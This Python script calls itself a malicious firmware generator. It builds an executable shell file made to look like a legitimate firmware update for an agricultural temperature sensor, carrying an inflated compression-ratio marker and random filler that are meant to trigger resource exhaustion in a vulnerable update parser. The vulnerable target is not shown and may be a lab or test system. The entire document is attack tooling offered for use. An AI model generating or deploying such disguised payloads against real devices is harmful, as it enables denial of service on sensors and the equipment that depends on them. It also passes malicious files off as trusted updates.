#!/usr/bin/env python3
"""
Malicious Firmware Generator for IoT sensor resource exhaustion attacks.
This script creates firmware files designed to trigger resource exhaustion vulnerabilities.
"""

import os
import sys
import argparse
import random
import string

def create_malicious_firmware(output_path, compression_ratio=1000, size_kb=10):
    """
    Create a malicious firmware file that will trigger resource exhaustion
    
    Args:
        output_path: Path to save the malicious firmware file
        compression_ratio: Claimed compression ratio (higher = more resource intensive)
        size_kb: Base size of the firmware file in KB
    """
    # Base content - this would be a small file that claims to expand to a much larger size
    header = f"""#!/bin/bash
echo "Malicious firmware update starting..."
echo "Version: 1.2.3-EXPLOIT"
echo "Target: Agricultural temperature sensor"
echo "Date: $(date)"
echo "Starting installation process..."

"""
    
    # Add the special marker that triggers the vulnerability
    exploit = f"COMPRESS-RATIO:{compression_ratio}\n"
    
    # Add some filler content to make it look legitimate
    # Generate random alphanumeric content to reach the requested size
    chars = string.ascii_letters + string.digits
    target_size = size_kb * 1024 - len(header) - len(exploit) - 100  # Reserve some space for footer
    filler = ''.join(random.choice(chars) for _ in range(target_size))
    
    # Add a harmless command at the end
    footer = """
echo "Firmware update complete"
echo "Rebooting sensor..."
exit 0
"""
    
    # Combine all parts
    content = header + exploit + filler + footer
    
    # Write to file
    with open(output_path, 'w') as f:
        f.write(content)
    
    # Make the file executable
    os.chmod(output_path, 0o755)
    
    print(f"Malicious firmware created at {output_path}")
    print(f"File size: {len(content)} bytes")
    print(f"Claimed expansion size: {len(content) * compression_ratio} bytes")
    print(f"Compression ratio: {compression_ratio}:1")

def main():
    parser = argparse.ArgumentParser(description='Generate malicious firmware files for IoT sensors')
    parser.add_argument('--output', '-o', default='malicious_firmware.sh',
                        help='Output file path (default: malicious_firmware.sh)')
    parser.add_argument('--ratio', '-r', type=int, default=1000,
                        help='Compression ratio (default: 1000)')
    parser.add_argument('--size', '-s', type=int, default=10,
                        help='Base file size in KB (default: 10)')
    
    args = parser.parse_args()
    
    create_malicious_firmware(args.output, args.ratio, args.size)

if __name__ == "__main__":
    main()